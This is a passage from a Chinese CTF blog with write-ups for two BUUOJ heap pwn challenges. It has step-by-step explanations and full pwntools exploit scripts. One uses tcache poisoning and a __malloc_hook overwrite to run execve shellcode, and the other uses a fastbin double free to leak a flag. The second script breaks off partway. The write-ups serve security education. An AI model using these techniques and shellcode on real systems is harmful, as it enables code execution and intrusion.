-<p><img src="https://i.imgs.ovh/2023/10/21/21glC.png" alt="image-20231021214117731"></p>
-<h5 id="然后free掉堆0"><a href="#然后free掉堆0" class="headerlink" title="然后free掉堆0"></a>然后free掉堆0</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<h5 id="然后edit堆2-也就是输入内容，构造下面的unlink"><a href="#然后edit堆2-也就是输入内容，构造下面的unlink" class="headerlink" title="然后edit堆2,也就是输入内容，构造下面的unlink"></a>然后edit堆2,也就是输入内容，构造下面的unlink</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x420</span>+<span class="number">0x20</span>+<span class="number">0x30</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgs.ovh/2023/10/21/2JLl9.png" alt="image-20231021222737762"></p>
-<h5 id="在free堆3后，就会unlink合并，四个堆合并在一起"><a href="#在free堆3后，就会unlink合并，四个堆合并在一起" class="headerlink" title="在free堆3后，就会unlink合并，四个堆合并在一起"></a>在free堆3后，就会unlink合并，四个堆合并在一起</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">3</span>) free堆<span class="number">3</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgs.ovh/2023/10/21/2JXbO.png" alt="image-20231021223134709"></p>
-<h5 id="这里存堆0，堆3的指针都被清掉了。"><a href="#这里存堆0，堆3的指针都被清掉了。" class="headerlink" title="这里存堆0，堆3的指针都被清掉了。"></a>这里存堆0，堆3的指针都被清掉了。</h5><p><img src="https://i.imgs.ovh/2023/10/21/2Jr5H.png" alt="image-20231021223200332"></p>
-<h5 id="再free堆1，堆2"><a href="#再free堆1，堆2" class="headerlink" title="再free堆1，堆2"></a>再free堆1，堆2</h5><p><img src="https://i.imgs.ovh/2023/10/21/2JFXD.png" alt="image-20231021223634211"></p>
-<p><img src="https://i.imgs.ovh/2023/10/21/2JABo.png" alt="image-20231021223742057"></p>
-<h5 id="然后又malloc两次-两个大小加起来刚好是0x970-会从原来的freechunk中拿。"><a href="#然后又malloc两次-两个大小加起来刚好是0x970-会从原来的freechunk中拿。" class="headerlink" title="然后又malloc两次,两个大小加起来刚好是0x970,会从原来的freechunk中拿。"></a>然后又malloc两次,两个大小加起来刚好是0x970,会从原来的freechunk中拿。</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">0x510</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgs.ovh/2023/10/22/25gco.png" alt="image-20231022185742061"></p>
-<p><img src="https://i.imgs.ovh/2023/10/22/25t9A.png" alt="image-20231022185800359"></p>
-<p><img src="https://i.imgs.ovh/2023/10/22/25JH5.png" alt="image-20231022185836223"></p>
-<h5 id="然后编辑这两个堆的内容"><a href="#然后编辑这两个堆的内容" class="headerlink" title="然后编辑这两个堆的内容"></a>然后编辑这两个堆的内容</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0x410</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(mmap_addr+<span class="number">0x10</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">fill(<span class="number">1</span>,<span class="string">&#x27;\x30&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<h5 id="编辑完后，这是堆0的"><a href="#编辑完后，这是堆0的" class="headerlink" title="编辑完后，这是堆0的"></a>编辑完后，这是堆0的</h5><p><img src="https://i.imgs.ovh/2023/10/22/25UdX.png" alt="image-20231022190729493"></p>
-<h5 id="成功修改了0x30的tachebin指针成mmap-10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main-arena-96这个地址。"><a href="#成功修改了0x30的tachebin指针成mmap-10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main-arena-96这个地址。" class="headerlink" title="成功修改了0x30的tachebin指针成mmap+10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main_arena+96这个地址。"></a>成功修改了0x30的tachebin指针成mmap+10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main_arena+96这个地址。</h5><p><img src="https://i.imgs.ovh/2023/10/22/25j2U.png" alt="image-20231022190804852"></p>
-<h5 id="这是堆1的，bin指针修改成了malloc-hook的地址。"><a href="#这是堆1的，bin指针修改成了malloc-hook的地址。" class="headerlink" title="这是堆1的，bin指针修改成了malloc_hook的地址。"></a>这是堆1的，bin指针修改成了malloc_hook的地址。</h5><p><img src="https://i.imgs.ovh/2023/10/22/25yUK.png" alt="image-20231022191125950"></p>
-<h5 id="原本的话指向main-arena-96这个地址，改掉最后的字节成0x30就是malloc-hook的地址"><a href="#原本的话指向main-arena-96这个地址，改掉最后的字节成0x30就是malloc-hook的地址" class="headerlink" title="原本的话指向main_arena+96这个地址，改掉最后的字节成0x30就是malloc_hook的地址"></a>原本的话指向main_arena+96这个地址，改掉最后的字节成0x30就是malloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/22/2YPP2.png" alt="image-20231022191235807"></p>
-<h5 id="再malloc两次，把多余的freechunk拿掉"><a href="#再malloc两次，把多余的freechunk拿掉" class="headerlink" title="再malloc两次，把多余的freechunk拿掉"></a>再malloc两次，把多余的freechunk拿掉</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x28</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgs.ovh/2023/10/22/2YV6j.png" alt="image-20231022191554689"></p>
-<h5 id="再add堆5，也就是在maap-10这个地址上放shellcode，手写shellcode是真的强好吧"><a href="#再add堆5，也就是在maap-10这个地址上放shellcode，手写shellcode是真的强好吧" class="headerlink" title="再add堆5，也就是在maap+10这个地址上放shellcode，手写shellcode是真的强好吧"></a>再add堆5，也就是在maap+10这个地址上放shellcode，手写shellcode是真的强好吧</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x28</span>)<span class="comment">#5</span></span><br><span class="line">payload2 = <span class="string">b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">fill(<span class="number">5</span>,payload2 + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgs.ovh/2023/10/22/2YLeI.png" alt="image-20231022191845126"></p>
-<h5 id="再add堆6，大小在0x10到0x18之间才能在0x20的tachebin-malloc-hook-里申请，这里我们放上st-addr-0x10的地址，也就是maap-addr-0x10的地址。"><a href="#再add堆6，大小在0x10到0x18之间才能在0x20的tachebin-malloc-hook-里申请，这里我们放上st-addr-0x10的地址，也就是maap-addr-0x10的地址。" class="headerlink" title="再add堆6，大小在0x10到0x18之间才能在0x20的tachebin(malloc_hook)里申请，这里我们放上st_addr+0x10的地址，也就是maap_addr+0x10的地址。"></a>再add堆6，大小在0x10到0x18之间才能在0x20的tachebin(malloc_hook)里申请，这里我们放上st_addr+0x10的地址，也就是maap_addr+0x10的地址。</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">6</span>,p64(st_addr + <span class="number">0x10</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgs.ovh/2023/10/22/2YXGV.png" alt="image-20231022192746832"></p>
-<h5 id="这是堆5和堆6的地址，也就是mmap-10的地址和malloc-hook的地址"><a href="#这是堆5和堆6的地址，也就是mmap-10的地址和malloc-hook的地址" class="headerlink" title="这是堆5和堆6的地址，也就是mmap+10的地址和malloc_hook的地址"></a>这是堆5和堆6的地址，也就是mmap+10的地址和malloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/22/2Y2MJ.png" alt="image-20231022192836650"></p>
-<h5 id="最后，再malloc一次，就会执行malloc-hook-而这个地址就会去执行mmap-0x10这个地址，这个地址放又shellcode，成功提权。"><a href="#最后，再malloc一次，就会执行malloc-hook-而这个地址就会去执行mmap-0x10这个地址，这个地址放又shellcode，成功提权。" class="headerlink" title="最后，再malloc一次，就会执行malloc_hook,而这个地址就会去执行mmap+0x10这个地址，这个地址放又shellcode，成功提权。"></a>最后，再malloc一次，就会执行malloc_hook,而这个地址就会去执行mmap+0x10这个地址，这个地址放又shellcode，成功提权。</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29573</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./sctf_2019_easy_heap&quot;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Mmap: &#x27;</span>)</span><br><span class="line">mmap_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(mmap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>) </span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x420</span>+<span class="number">0x20</span>+<span class="number">0x30</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">0x510</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x410</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(mmap_addr+<span class="number">0x10</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">fill(<span class="number">1</span>,<span class="string">&#x27;\x30&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">5</span>,payload2)</span><br><span class="line">fill(<span class="number">6</span>,p64(mmap_addr + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">buu</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2023/10/21/sctf-2019-easy-heap/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-gyctf_2020_some_thing_exceting" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h1><h4 id="有点奇怪的UAF题，double-free-有点奇怪"><a href="#有点奇怪的UAF题，double-free-有点奇怪" class="headerlink" title="有点奇怪的UAF题，double free 有点奇怪"></a>有点奇怪的UAF题，double free 有点奇怪</h4><h4 id="做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来"><a href="#做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来" class="headerlink" title="做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来"></a>做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来</h4><p><img src="https://i.imgs.ovh/2023/10/16/rORK5.png" alt="image-20231016195506227"></p>
-<h4 id="flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8"><a href="#flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8" class="headerlink" title="flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8"></a>flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOQlA.png" alt="image-20231016195328962"></p>
-<h4 id="除了没有edit函数，其他都有"><a href="#除了没有edit函数，其他都有" class="headerlink" title="除了没有edit函数，其他都有"></a>除了没有edit函数，其他都有</h4><h4 id="add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。"><a href="#add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。" class="headerlink" title="add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。"></a>add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOuOD.png" alt="image-20231016194828854"></p>
-<h4 id="show函数，将两个地址的内容都打印出来，后期是用来打印flag"><a href="#show函数，将两个地址的内容都打印出来，后期是用来打印flag" class="headerlink" title="show函数，将两个地址的内容都打印出来，后期是用来打印flag"></a>show函数，将两个地址的内容都打印出来，后期是用来打印flag</h4><p><img src="https://i.imgs.ovh/2023/10/16/rO7Eo.png" alt="image-20231016195158667"></p>
-<h4 id="dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double-free"><a href="#dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double-free" class="headerlink" title="dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double free"></a>dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double free</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOt0U.png" alt="image-20231016195828924"></p>
-<h4 id="漏洞是利用double-free-先单独free同一个两次堆不行，得先创建两次"><a href="#漏洞是利用double-free-先单独free同一个两次堆不行，得先创建两次" class="headerlink" title="漏洞是利用double free ,先单独free同一个两次堆不行，得先创建两次"></a>漏洞是利用double free ,先单独free同一个两次堆不行，得先创建两次</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bss=<span class="number">0x6020a8</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;MMMM&#x27;</span>,<span class="number">0x50</span>,<span class="string">&#x27;NNNN&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;AAAA&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;BBBB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgs.ovh/2023/10/16/ruHnp.png" alt="image-20231016161307844"></p>
-<p><img src="https://i.imgs.ovh/2023/10/16/ruMbT.png" alt="image-20231016161325105"></p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<h4 id="这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零"><a href="#这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零" class="headerlink" title="这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零"></a>这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零</h4><p><img src="https://i.imgs.ovh/2023/10/16/rup5u.png" alt="image-20231016161832970"></p>
-<p><img src="https://i.imgs.ovh/2023/10/16/ruuyO.png" alt="image-20231016162207401"></p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0</span>) <span class="comment">#double free</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="这里的话是double-free-，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等"><a href="#这里的话是double-free-，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等" class="headerlink" title="这里的话是double free ，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等"></a>这里的话是double free ，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等</h4><p><img src="https://i.imgs.ovh/2023/10/16/ru4mt.png" alt="image-20231016163943852"></p>
-<p><img src="https://i.imgs.ovh/2023/10/16/ruzIU.png" alt="image-20231016162508547"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x40,p64(bss),0x40,&#x27;AAAA&#x27;)</span><br></pre></td></tr></table></figure>
-
-<h4 id="再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址"><a href="#再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址" class="headerlink" title="再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址"></a>再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址</h4><p><img src="https://i.imgs.ovh/2023/10/16/rujCC.png" alt="image-20231016163754041"></p>
-<p><img src="https://i.imgs.ovh/2023/10/16/ru5cm.png" alt="image-20231016164225408"></p>
-<h4 id="再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址"><a href="#再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址" class="headerlink" title="再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址"></a>再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;MMMM&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;kkkk&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgs.ovh/2023/10/16/ruv62.png" alt="image-20231016164831150"></p>
-<p><img src="https://i.imgs.ovh/2023/10/16/ruycj.png" alt="image-20231016164848340"></p>
-<h4 id="再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc-0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。"><a href="#再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc-0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。" class="headerlink" title="再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc 0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。"></a>再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc 0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。"><a href="#想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。" class="headerlink" title="想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。"></a>想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。</h4><p><img src="https://i.imgs.ovh/2023/10/16/r7XdW.png" alt="image-20231016170214324"></p>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,26884)</span></span><br><span class="line">p=process(<span class="string">&quot;./gyctf_2020_some_thing_exceting&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./gyctf_2020_some_thing_exceting&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size1,content1,size2,content2</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Now please tell me what you want to do :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; ba&#x27;s length : &quot;</span>,<span class="built_in">str</span>(size1))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; ba : &#x27;</span>,content1)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; na&#x27;s length : &quot;</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; na : &#x27;</span>,content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Now please tell me what you want to do :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Banana ID :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Now please tell me what you want to do :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; Banana ID : &gt; SCP project ID : &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x6020a8</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;MMMM&#x27;</span>,<span class="number">0x50</span>,<span class="string">&#x27;NNNN&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;AAAA&#x27;</span>,<span class="number">0x50</span>,<span class="string">&#x27;BBBB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span 